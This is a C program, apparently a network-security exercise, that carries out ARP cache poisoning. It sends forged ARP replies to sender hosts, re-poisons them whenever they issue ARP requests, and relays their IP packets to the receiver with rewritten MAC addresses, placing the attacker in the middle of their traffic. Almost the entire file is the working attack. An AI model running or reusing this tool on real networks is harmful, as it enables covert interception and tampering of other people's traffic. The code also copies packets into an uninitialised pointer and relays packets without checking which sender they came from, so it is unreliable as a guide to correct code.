/*  
	1. send arp request to sender and receiver
	2. send arp reply to make sender spoofed
	3. whenever sender try to update arp table, make sender spoofed by arp reply
	3-1. if arp target ip is same to receiver's ip
	4. if sender send ip packet to receiver, 
		change ethernet address and send relay packet to receiver
*/

#include "arp_spoof.h"

int main(int argc, char *argv[]){
	int i=0, j=0;

	if (argc<4){
		usage();
		return -1;
	}
	
	u_int8_t my_mac[6];
	u_int8_t my_ip[4];
	u_int8_t broadcast_ether[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
	u_int8_t none_ether[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	struct objective_list *list;
	
	/* know my mac address and ip address */
	get_my_dev(my_mac, my_ip, dev);
	
	/* make a list for arp spoofing */
	int pair = (argc-2)/2;
	list = (struct objective_list*)malloc(pair * sizeof(struct objective_list));

	for(i=0; i<pair; i++){
		inet_aton(argv[2*i+2], (in_addr *)list[j].sender_ip);
		inet_aton(argv[2*i+3], (in_addr *)list[j].receiver_ip);
		j++;
	}
	
	pcap_t*	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}
	
	/* for getting info about mac addr of sender and receiver */
	for(i=0; i<pair; i++){
		send_arp(handle, broadcast_ether, none_ether, list[i].sender_ip, my_ip, my_mac, 1);  // handle, ether_dhost, target_mac, target_ip, source_ip, my_mac, type
		printf("send arp to sender[%d]\n", i);
		get_the_mac(handle, list[i].sender_ip, list[i].sender_mac);  // handle, target_ip, mac_to_know
		printf("get mac of sender[%d]\n", i);
		send_arp(handle, broadcast_ether, none_ether, list[i].receiver_ip, my_ip, my_mac, 1);
		printf("send arp to receiver[%d]\n", i);		
		get_the_mac(handle, list[i].receiver_ip, list[i].receiver_mac);	
		printf("get mac of receiver[%d]\n", i);
	}
	
	/* make sender spoofed by fake arp reply */
	for(i=0; i<pair; i++){
		send_arp(handle, list[i].sender_mac, list[i].sender_mac, list[i].sender_ip, list[i].receiver_ip, my_mac, 2);
		printf("send reply to sender[%d]\n", i);
	}
	printf("-----------all senders are spoofed since now-----------\n");
	/* receive packets */
	struct ethernet_header *ether_hdr;
	struct ip *ip_hdr;
	struct arp_header *arp_hdr;
	struct arp_packet *arp_p;

	while(1){
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0 || res == -1 || res == -2) continue;
		
		ether_hdr = (struct ethernet_header *)packet;
		
		/* divided by every session */
		for (i=0; i<pair; i++){
			if (ntohs(ether_hdr->ether_type) == ETHERTYPE_ARP){
				arp_hdr = (arp_header*)(packet + sizeof(ethernet_header));
				arp_p = (arp_packet *)packet;

				/* check if the arp is arp request from sender to receiver */			
				if (ntohs(arp_p->ar_op) == ARPOP_REQUEST){
					send_arp(handle, list[i].sender_mac, list[i].sender_mac, list[i].sender_ip, list[i].receiver_ip, my_mac, 2);
					printf("send reply to sender[%d]\n", i);
				}
			}
	
			else if (ntohs(ether_hdr->ether_type) == ETHERTYPE_IP){
				ip_hdr = (ip*)(packet + sizeof(ethernet_header));
			
				if (ip_hdr->ip_dst.s_addr != *(uint32_t*)my_ip){  // check if it is an ip packet to receiver
					u_int8_t *relay;
					memcpy(relay, packet, header->caplen);
					ether_hdr = (struct ethernet_header *)relay;
					
					/* fake mac information */
					memcpy(ether_hdr->ether_dhost,list[i].receiver_mac,6);
					memcpy(ether_hdr->ether_shost,my_mac,6);
						
					pcap_sendpacket(handle, relay, header->caplen);  // send relay packet
					printf("send relay packet from sender[%d] to receiver[%d]\n", i, i);
				}
			}
		}
	}

	free(list);

	return 0;
}

